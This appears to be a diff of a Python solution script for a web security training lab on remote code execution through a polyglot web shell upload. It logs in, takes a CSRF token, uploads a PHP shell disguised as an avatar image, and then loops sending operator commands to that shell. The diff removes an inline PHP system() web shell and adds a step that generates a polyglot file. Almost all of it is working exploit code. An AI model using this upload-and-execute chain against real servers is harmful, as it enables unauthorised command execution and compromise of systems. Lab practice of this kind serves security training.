@@ -1,13 +1,13 @@
 import http.client
-import io
 import re
 import ssl
 import urllib.parse
+import subprocess
 
 from werkzeug.datastructures.file_storage import FileStorage
 from werkzeug.test import encode_multipart
 
-LAB_ID = "???"
+LAB_ID = "0af400a70468220a8064a33800410067"
 
 
 def GET_login() -> http.client.HTTPResponse:
@@ -103,7 +103,7 @@ def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResp
         'avatar': {
             'filename': 'shell.php',
             'content_type': 'application/x-httpd-php',
-            'content': """<?php echo system($_GET['command']); ?>""",
+            'file_path': 'shell.jpg',
         },
     }
     _, body = encode_multipart(
@@ -115,7 +115,7 @@ def POST_myaccount_avatar_shell(csrf: str, session: str) -> http.client.HTTPResp
                    field_name: FileStorage(
                        filename=file['filename'],
                        content_type=file['content_type'],
-                       stream=io.BytesIO(file['content'].encode('utf-8')),
+                       stream=open(file['file_path'], 'rb'),
                    ) for field_name, file in files.items()
                },
     )
@@ -130,11 +130,10 @@ def GET_files_avatars_shell_php(command: str) -> http.client.HTTPResponse:
     method, path = 'GET', f'/files/avatars/shell.php?{urllib.parse.urlencode(params)}'
     host, port = f'{LAB_ID}.web-security-academy.net', 443
     headers = {
-        'accept': 'image/avif,image/webp,*/*',
+        'accept': '*/*',
         'accept-language': 'en-US,en;q=0.5',
         'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
         'cookie': f'session={session}',
-        'sec-fetch-dest': 'image',
         'sec-fetch-mode': 'no-cors',
         'sec-fetch-site': 'same-origin',
         'te': 'trailers',
@@ -165,12 +164,18 @@ def login_session() -> str:
     return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
 
 
+subprocess.run(
+    ['php', '-d', 'phar.readonly=0', 'Remote-code-execution-via-polyglot-web-shell-upload.php']
+)
+print("created polyglot image.")
 session = login_session()
 print("logged in.")
 print(f"session: {session}")
 csrf = file_upload_csrf(session)
+print("got csrf.")
+print(f"file upload csrf: {csrf}")
 POST_myaccount_avatar_shell(csrf, session)
 print("got shell.")
 while True:
     command = input("insert command: ")
-    print(GET_files_avatars_shell_php(command).read().decode('utf-8'))
+    print(GET_files_avatars_shell_php(command).read())
